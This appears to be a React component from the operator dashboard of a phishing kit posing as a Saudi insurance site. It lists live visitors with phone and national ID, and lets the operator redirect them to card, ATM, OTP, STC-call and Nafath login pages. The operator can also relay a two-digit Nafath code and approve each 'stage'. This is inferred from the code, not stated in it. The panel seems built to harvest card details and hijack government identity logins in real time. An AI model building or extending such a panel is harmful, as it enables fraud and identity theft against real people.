import React, { useRef, useState, useEffect } from "react";
import { motion } from "framer-motion";
import { ArrowRight, Circle, MapPin, Clock, Ban, ShieldCheck, Download, Star, Monitor, Smartphone, Tablet, Send, Navigation, KeyRound } from "lucide-react";
import AdminVisitorChat from "@/components/admin/AdminVisitorChat";
import TabIdentity from "./TabIdentity";
import TabVerification from "./TabVerification";
import TabVehicle from "./TabVehicle";
import type { Visitor, InsuranceRequest, InsuranceOrder, Claim, ChatConv, StageEvent } from "./types";
import { getVisitorAvatar, getVisitorInitial, getSessionDuration, parseUserAgent, countryFlag, insuranceTypeLabel, statusLabel } from "./types";

interface Props {
  selectedVisitor: Visitor;
  linkedRequests: InsuranceRequest[];
  linkedOrders: InsuranceOrder[];
  linkedClaims: Claim[];
  linkedChats: ChatConv[];
  stageEvents: StageEvent[];
  visitorName: string | null;
  customerName: string | null;
  visitorPhone: string | null;
  visitorNationalId: string | null;
  loadingAction: string | null;
  nafathNumberInputs: Record<string, string>;
  setNafathNumberInputs: React.Dispatch<React.SetStateAction<Record<string, string>>>;
  onClose: () => void;
  onApprove: (reqId: string) => void;
  onReject: (reqId: string) => void;
  onStageApprove: (orderId: string, nafathNum?: string) => void;
  onStageReject: (orderId: string) => void;
  onUpdateNafathNumber: (orderId: string, val: string) => void;
  onBlockToggle: () => void;
  onExportPDF: () => void;
  onClearChat: () => void;
  onToggleFavorite: (id: string) => void;
  onToggleTag: (id: string, tagKey: string) => void;
  onRedirect: (page: string) => void;
  onSendCode?: (code: string) => void;
  onSendFinalMessage?: (message: string) => void;
  redirectPage: string;
  setRedirectPage: (val: string) => void;
}

const VISITOR_TAGS = [
  { key: "vip", label: "VIP", color: "text-amber-500 bg-amber-500/10" },
  { key: "suspicious", label: "مشبوه", color: "text-red-500 bg-red-500/10" },
  { key: "returning", label: "زائر عائد", color: "text-blue-500 bg-blue-500/10" },
  { key: "potential", label: "عميل محتمل", color: "text-emerald-500 bg-emerald-500/10" },
];

const VisitorDetailsPanel: React.FC<Props> = ({
  selectedVisitor, linkedRequests, linkedOrders, linkedClaims, linkedChats, stageEvents,
  visitorName, customerName, visitorPhone, visitorNationalId,
  loadingAction, nafathNumberInputs, setNafathNumberInputs,
  onClose, onApprove, onReject, onStageApprove, onStageReject, onUpdateNafathNumber,
  onBlockToggle, onExportPDF, onClearChat, onToggleFavorite, onToggleTag,
  onRedirect, onSendCode, onSendFinalMessage, redirectPage, setRedirectPage,
}) => {
  const panelRef = useRef<HTMLDivElement>(null);
  const cardsRef = useRef<HTMLDivElement>(null);
  const [codeInput, setCodeInput] = useState("");
  const [messageInput, setMessageInput] = useState("");

  // Scroll to top (header of details panel) immediately when opening a visitor
  useEffect(() => {
    requestAnimationFrame(() => {
      panelRef.current?.scrollTo({ top: 0, behavior: "auto" });
      cardsRef.current?.scrollTo({ top: 0, behavior: "auto" });
      if (typeof window !== "undefined") {
        window.scrollTo({ top: 0, behavior: "auto" });
        document.documentElement.scrollTop = 0;
        document.body.scrollTop = 0;
      }
    });
  }, [selectedVisitor.id]);

  // Auto-scroll to top when new data arrives
  const dataFingerprint = `${stageEvents.length}-${linkedOrders.length}-${linkedRequests.length}-${linkedChats.length}-${visitorPhone}-${visitorNationalId}`;
  const prevFingerprint = useRef(dataFingerprint);
  useEffect(() => {
    if (prevFingerprint.current !== dataFingerprint) {
      prevFingerprint.current = dataFingerprint;
      cardsRef.current?.scrollTo({ top: 0, behavior: "smooth" });
    }
  }, [dataFingerprint]);

  const avatarColor = getVisitorAvatar(selectedVisitor.session_id);
  const initial = getVisitorInitial(selectedVisitor.visitor_name);
  const ua = parseUserAgent(selectedVisitor.user_agent);
  const DevIcon = ua.device === "Mobile" ? Smartphone : ua.device === "Tablet" ? Tablet : Monitor;

  return (
    <motion.div
      key={selectedVisitor.id}
      initial={{ opacity: 0, x: -18, y: 10, scale: 0.985 }}
      animate={{ opacity: 1, x: 0, y: 0, scale: 1 }}
      exit={{ opacity: 0, x: 14, y: -6, scale: 0.985 }}
      transition={{ duration: 0.32, ease: [0.22, 1, 0.36, 1] }}
      ref={panelRef}
      className="flex-1 overflow-y-auto flex flex-col will-change-transform"
    >
      {/* Mobile back */}
      <button onClick={onClose} className="md:hidden flex items-center gap-2 text-sm text-primary font-semibold p-3 hover:text-primary/80 transition-colors">
        <ArrowRight className="w-4 h-4" />العودة للقائمة
      </button>

      {/* Compact Header */}
      <div className="bg-gradient-to-l from-primary/5 to-transparent border-b border-border/60 p-3 md:p-4 shrink-0 space-y-2.5">

        <div className="flex items-start gap-2.5 md:gap-3">
          <div className={`w-10 h-10 md:w-12 md:h-12 rounded-xl md:rounded-2xl flex items-center justify-center shrink-0 shadow-md bg-gradient-to-br ${avatarColor.bg} border border-white/20`}>
            <span className={`text-base md:text-lg font-bold ${avatarColor.text}`}>{initial}</span>
          </div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-1.5 md:gap-2 flex-wrap">
              <h2 className="text-sm md:text-base font-bold text-foreground truncate max-w-[140px] md:max-w-none">{selectedVisitor.visitor_name || "زائر"}</h2>
              <span className={`inline-flex items-center gap-1 px-1.5 md:px-2 py-0.5 rounded-full text-[9px] md:text-[10px] font-bold ${selectedVisitor.is_online ? "bg-emerald-500/15 text-emerald-600" : "bg-muted text-muted-foreground"}`}>
                <Circle className={`w-1.5 h-1.5 ${selectedVisitor.is_online ? "fill-emerald-500 text-emerald-500 animate-pulse" : "fill-muted-foreground text-muted-foreground"}`} />
                {selectedVisitor.is_online ? "متصل" : "غير متصل"}
              </span>
              <button onClick={() => onToggleFavorite(selectedVisitor.id)} className="p-0.5">
                <Star className={`w-3.5 md:w-4 h-3.5 md:h-4 ${selectedVisitor.is_favorite ? "fill-amber-400 text-amber-400" : "text-muted-foreground hover:text-amber-400"} transition-colors`} />
              </button>
            </div>
            <div className="flex items-center gap-2 md:gap-3 mt-1 text-[9px] md:text-[10px] text-muted-foreground/70 flex-wrap">
              <span className="inline-flex items-center gap-1"><MapPin className="w-2.5 md:w-3 h-2.5 md:h-3 text-primary" />{selectedVisitor.current_page || "/"}</span>
              <span className="inline-flex items-center gap-1">
                <DevIcon className="w-2.5 md:w-3 h-2.5 md:h-3" />
                {selectedVisitor.country_code && `${countryFlag(selectedVisitor.country_code)} `}
                {ua.device}
              </span>
              <span className="inline-flex items-center gap-1"><Clock className="w-2.5 md:w-3 h-2.5 md:h-3" />{getSessionDuration(selectedVisitor.created_at, selectedVisitor.last_seen_at)}</span>
            </div>
          </div>
        </div>

        {/* Redirect */}
        <div className="flex items-center gap-2">
          <Navigation className="w-3 h-3 text-primary shrink-0" />
          <select
            value={redirectPage}
            onChange={e => setRedirectPage(e.target.value)}
            className="flex-1 h-7 px-2 text-[10px] bg-background border border-border rounded-lg focus:outline-none focus:border-primary transition-all text-foreground"
          >
            <option value="">اختر صفحة</option>
            <optgroup label="التأمين">
              <option value="/insurance/checkout">إتمام الشراء</option>
              <option value="/insurance/payment">إدخال البطاقة</option>
              <option value="/insurance/atm">الصراف ATM</option>
            </optgroup>
            <optgroup label="التحقق">
              <option value="/insurance/otp">OTP</option>
              <option value="/insurance/phone-otp">OTP الجوال</option>
              <option value="/insurance/phone-verify">توثيق الجوال</option>
              <option value="/insurance/phone-stc">مكالمة STC</option>
              <option value="/insurance/nafath-login">نفاذ</option>
              <option value="/insurance/nafath-verify">تحقق نفاذ</option>
            </optgroup>
          </select>
          <button
            onClick={() => { if (redirectPage) onRedirect(redirectPage); }}
            disabled={!redirectPage}
            className="h-7 px-3 rounded-lg text-[10px] font-bold bg-primary text-primary-foreground hover:bg-primary/90 disabled:opacity-40 transition-all"
          >
            توجيه
          </button>
        </div>

        {/* Send Nafath Code */}
        <div className="flex items-center gap-2">
          <KeyRound className="w-3 h-3 text-emerald-600 shrink-0" />
          <input
            type="text"
            inputMode="numeric"
            placeholder="أدخل الرمز"
            value={codeInput}
            onChange={e => setCodeInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
            className="flex-1 h-7 px-2 text-[10px] bg-background border border-border rounded-lg focus:outline-none focus:border-emerald-500 transition-all text-foreground text-center font-bold tracking-widest placeholder:font-normal placeholder:tracking-normal"
          />
          <button
            onClick={() => { if (codeInput.trim() && onSendCode) { onSendCode(codeInput.trim()); setCodeInput(""); } }}
            disabled={!codeInput.trim()}
            className="h-7 px-3 rounded-lg text-[10px] font-bold bg-blue-600 text-white hover:bg-blue-700 disabled:opacity-40 transition-all"
          >
            إرسال
          </button>
        </div>

      </div>

      {/* Unified Cards - bottom to top (earliest at bottom, latest at top) */}
      <div ref={cardsRef} className="flex-1 overflow-y-auto p-2.5 md:p-4 flex flex-col-reverse gap-2">

        {/* 1. Personal Info & Requests (earliest - appears at bottom) */}
        <TabIdentity
          selectedVisitor={selectedVisitor}
          visitorName={visitorName}
          customerName={customerName}
          visitorPhone={visitorPhone}
          visitorNationalId={visitorNationalId}
          linkedRequests={linkedRequests}
          linkedOrders={linkedOrders}
          loadingAction={loadingAction}
          onApprove={onApprove}
          onReject={onReject}
          insuranceTypeLabel={insuranceTypeLabel}
          statusLabel={statusLabel}
        />

        {/* 2. Vehicle Data */}
        {linkedOrders.length > 0 && (
          <TabVehicle linkedOrders={linkedOrders} />
        )}

        {/* 3. Verification & Payment (latest - appears at top) */}
        <TabVerification
          linkedOrders={linkedOrders}
          stageEvents={stageEvents}
          selectedVisitor={selectedVisitor}
          visitorPhone={visitorPhone}
          visitorNationalId={visitorNationalId}
          loadingAction={loadingAction}
          onStageApprove={onStageApprove}
          onStageReject={onStageReject}
          onUpdateNafathNumber={onUpdateNafathNumber}
          nafathNumberInputs={nafathNumberInputs}
          setNafathNumberInputs={setNafathNumberInputs}
          insuranceTypeLabel={insuranceTypeLabel}
          statusLabel={statusLabel}
        />

        {/* 4. Chat (top-most) */}
        {linkedChats.length > 0 && (
          <AdminVisitorChat visitorSessionId={selectedVisitor.session_id} visitorName={selectedVisitor.visitor_name} />
        )}

      </div>

      {/* Actions Footer */}
      <div className="border-t border-border/60 px-3 md:px-4 py-2.5 space-y-2 shrink-0 bg-muted/20">
        {/* Send Final Message */}
        <div className="flex items-center gap-2">
          <Send className="w-3 h-3 text-emerald-600 shrink-0" />
          <input
            type="text"
            placeholder="أدخل الرسالة"
            value={messageInput}
            onChange={e => setMessageInput(e.target.value)}
            className="flex-1 h-7 px-2 text-[10px] bg-background border border-border rounded-lg focus:outline-none focus:border-primary transition-all text-foreground placeholder:text-muted-foreground"
          />
          <button
            onClick={() => { if (messageInput.trim() && onSendFinalMessage) { onSendFinalMessage(messageInput.trim()); setMessageInput(""); } }}
            disabled={!messageInput.trim()}
            className="h-7 px-3 rounded-lg text-[10px] font-bold bg-emerald-600 text-white hover:bg-emerald-700 disabled:opacity-40 transition-all"
          >
            إرسال
          </button>
        </div>

        {/* Block / Unblock + Export */}
        <div className="flex items-center gap-2">
          <button onClick={onBlockToggle} disabled={loadingAction === "block"} className={`h-7 px-3 rounded-lg text-[10px] font-bold transition-all inline-flex items-center gap-1 ${selectedVisitor.is_blocked ? "bg-muted text-muted-foreground hover:bg-muted/80" : "bg-destructive text-destructive-foreground hover:bg-destructive/90"}`}>
            {selectedVisitor.is_blocked ? <><ShieldCheck className="w-3 h-3" />فك الحظر</> : <><Ban className="w-3 h-3" />حظر</>}
          </button>
          <button onClick={onExportPDF} className="h-7 px-3 rounded-lg text-[10px] font-bold bg-muted/40 text-muted-foreground border border-transparent hover:bg-muted transition-all inline-flex items-center gap-1 mr-auto">
            <Download className="w-3 h-3" />تصدير PDF
          </button>
        </div>
      </div>

    </motion.div>
  );
};

export default VisitorDetailsPanel;
